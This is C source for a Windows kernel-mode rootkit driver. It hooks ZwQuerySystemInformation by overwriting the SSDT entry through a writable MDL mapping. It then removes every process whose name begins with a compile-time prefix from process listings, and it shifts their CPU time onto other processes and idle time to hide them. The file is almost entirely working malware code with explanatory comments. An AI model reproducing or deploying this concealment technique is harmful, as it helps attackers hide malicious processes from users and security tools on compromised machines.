#include "common.h"
#include "user_defined_types.h"
#include "process_threads_structure.h"
#include "ssdt_structures.h"

#ifndef PROCESS_START
#error Error, you must define the variable PROCESS_START, with name of processes to hide
#endif // !PROCESS_START



/*
*	Code to modify memory protection of the SSDT
*	for that we will use a structure to emulate the 
*	KeServiceDescriptorTable, this table points
*	to the SSDT and the SSDP, where you can find
*	the routines that are executed when you execute
*	the instruction INT 0x2E or SYSENTER (Syscalls)
*/

// variable which will save the  KeServiceDescriptorTable
// pointing to SSDT methods
__declspec (dllimport) SSDT_Entry KeServiceDescriptorTable;

/*
*	Variable which contains the address of start, the
*	owner process, number of bytes and flags for a
*	memory region
*/
PMDL g_pmdlSystemCall;

/*
*	Table of calls  to the mapped system in our memory
*/
PVOID *MappedSystemCallTable;

/*
*	The next two defines are used to get information from syscalls
*	these defines work because the functions Zw* start by:
*		mov eax, <number>
*	where number is the index to the system call on the SSDT, so
*	looking to the second byte of the function, we get that index.
*	For example with ZwCreateFile:
*		NTSTATUS __stdcall ZwCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength)
*		{
*			mov eax, 42h ; NtCreateFile
*			...
*	This code has been extracted from ntdll.dll using IDA Pro
*
*	This index is used to point to a value in Ntoskrnl.exe, to one of the Nt* functions, on this case NtWriteFile
*/


/*
*	SYSTEMSERVICE get as parameter the address of a function from ntdll.dll,
*	a function of the type Zw*, then it retuns the address of the function
*	Nt* from Ntoskrnl.exe, that is the address of the function in the
*	SSDT table.
*/

#define SYSTEMSERVICE(_func) KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_func + 1)]

/*
*	SYSCALL_INDEX get as parameter the address of a Zw function and returns
*	the index number of the function in the SSDT.
*/
#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)


/*
*	MACROS to hook directly the SSDT address with one of our functions using the
*	name of a function Zw*.
*
*	Functions I use:
*		InterlockedExchange: set a variable of 32-bit with a specified value as an atomic operation
*/
#define HOOK_SYSCALL(_Function, _Hook, _Orig)						  \
						_Orig = (PVOID) InterlockedExchange ( (PLONG) \
						&MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)

#define UNHOOK_SYSCALL(_Func, _Hook, _Orig)			\
						InterlockedExchange((PLONG) \
						&MappedSystemCallTable[SYSCALL_INDEX(_Func)], (LONG) _Hook);

/*
*	Functions used as a pointers for the MACROS above,
*	This is almost copy-paste from Windows documentation
*	so no need for more explanations.
*/

NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength);


/*
* Tipo definido de función ZwQuerySystemInformation, lo usaremos
* luego para guardar un puntero a esa función
*/
/*
*	Defined type for the function ZwQuerySystemInformation, we will
*	use it later to save the pointer to that function.
*/
typedef NTSTATUS(*ZWQUERYSYSTEMINFORMATION)(
	ULONG SystemInformationCLass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

// puntero al anterior ZwQuerySystemInformation
ZWQUERYSYSTEMINFORMATION        OldZwQuerySystemInformation;

LARGE_INTEGER					m_UserTime;
LARGE_INTEGER					m_KernelTime;

// driver functions
NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath);
VOID Unload(IN PDRIVER_OBJECT DriverObject);

/*
* Función para filtrar el ZwQuerySystemInformation
*
* ZwQueryInformation() retorna una lista enlazada
* de procesos
* La función siguiente imita este comportamiento,
* salvo que quita de la lista aquellos nombres
* que empiezan por "__root__".
*/
/*
*	Function for filtering ZwQuerySystemInformation
*
*	ZwQueryInformation() returns a linked list of processes
*	The next function imitate that behaviour,
*	with the difference than it will filter from the list
*	all those names specified by a MACRO
*/
NTSTATUS NewZwQuerySystemInformation(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength
)
{
	NTSTATUS ntStatus;

	/*
	*	As we've saved the real function, we call it to get real data
	*/
	ntStatus = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation)) (SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);

	if (NT_SUCCESS(ntStatus)) // check everything was correct
	{
		// check if first parameter was SystemProcessInformation
		if (SystemInformationClass == SYSTEMPROCESSINFORMATION)
		{
			/*
			*	Now we are going to go through the process list
			*	searching for process name which start by the
			*	word defined during compiling.
			*/
			// As it is a linked list we will save the current process
			// and the last one, so if we have to remove one, will be 
			// easier to do it.
			struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *) SystemInformation;
			struct _SYSTEM_PROCESSES *prev = NULL;

			while (curr) // while there are processes on the list
			{
#ifdef DEBUG
				DbgPrint("[+] Actual Item is: 0x%x", curr);
#endif // DEBUG

				if (curr->ProcessName.Buffer != NULL) // if name is not null
				{
					if (memcmp(curr->ProcessName.Buffer, PROCESS_START, wcslen(PROCESS_START)) == 0)
					{
						// save the times for that process
						m_UserTime.QuadPart += curr->UserTime.QuadPart;
						m_KernelTime.QuadPart += curr->KernelTime.QuadPart;

						if (prev) // if we have previous process, we must link with the next
						{
							if (curr->NextEntryDelta) // we just link if we have next
							{
								prev->NextEntryDelta += curr->NextEntryDelta;
							}
							else // in case our current process is the last one
							{
								prev->NextEntryDelta = 0;
							}
						}

						else // if there's no previous pointer, we are the first one
						{
							if (curr->NextEntryDelta) // if current process is not the only one
							{
								// move SystemInformation forward
								(char *)SystemInformation += curr->NextEntryDelta;
							}
							else
							{
								// we are the only process (I don't believe it)
								SystemInformation = NULL;
							}
						}
					}
				}
				
				else // entry for legit process
				{
					// Add times of rootkit process to legit process
					curr->UserTime.QuadPart += m_UserTime.QuadPart;
					curr->KernelTime.QuadPart += m_KernelTime.QuadPart;
					// Set time again to 0, so it will not be added to another process anymore
					m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
				}

				prev = curr;

				if (curr->NextEntryDelta) // if there's more, continue
					((char *)curr += curr->NextEntryDelta);
				else
					curr = NULL;
			}
		}

		else if (SystemInformationClass == SYSTEMPROCESSORPERFORMANCEINFORMATION)
		{
			struct _SYSTEM_PROCESSOR_TIMES * times = (struct _SYSTEM_PROCESSOR_TIMES *)SystemInformation;

			times->IdleTime.QuadPart += m_UserTime.QuadPart + m_KernelTime.QuadPart;
		}
	}

	return ntStatus;
}

/*
*	Function to unload the driver
*/
VOID Unload(IN PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);
#ifdef DEBUG
	DbgPrint("%s\n", "Driver unloaded");
#endif // DEBUG

	// remove the hook
	UNHOOK_SYSCALL(ZwQuerySystemInformation,
		OldZwQuerySystemInformation,
		NewZwQuerySystemInformation);

	// unblock and free the MDL
	if (g_pmdlSystemCall)
	{
		MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
		IoFreeMdl(g_pmdlSystemCall);
	}

	return;
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	NTSTATUS status = STATUS_SUCCESS;

#ifdef DEBUG
	DbgPrint("%s\n", "Driver has been loaded.");
#endif // DEBUG

	// Set unload function
	DriverObject->DriverUnload = Unload;

	// Init global time
	m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;

	// Save pointer to previous call
	OldZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation));

	/*
	*	Map the memory inside of our domain to change
	*	memory permissions over MDL.
	*	Also we could set a bit from CR0 to 0 to
	*	allow writing to SSDT
	*/
	g_pmdlSystemCall = MmCreateMdl(NULL,
		KeServiceDescriptorTable.ServiceTableBase,
		KeServiceDescriptorTable.NumberOfServices * 4
	);

	// something was wrong
	if (!g_pmdlSystemCall)
		return STATUS_UNSUCCESSFUL;

	MmBuildMdlForNonPagedPool(g_pmdlSystemCall);

	// change security of memory
	g_pmdlSystemCall->MdlFlags = g_pmdlSystemCall->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;

	// point to the page of the SSDT
	MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode);

	// HOOK Syscall
	HOOK_SYSCALL(ZwQuerySystemInformation, NewZwQuerySystemInformation, OldZwQuerySystemInformation);

	return status;
}

